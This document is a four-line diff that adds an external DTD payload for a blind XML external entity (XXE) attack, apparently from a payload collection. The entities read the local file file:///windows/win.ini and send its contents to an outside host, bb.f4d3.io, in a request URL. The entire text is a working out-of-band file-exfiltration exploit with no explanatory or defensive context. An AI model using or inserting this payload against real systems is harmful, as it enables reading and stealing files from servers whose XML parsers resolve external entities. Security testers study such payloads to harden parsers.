@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "file:///windows/win.ini">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://bb.f4d3.io/%payload;'>">
+%int;
+%trick;
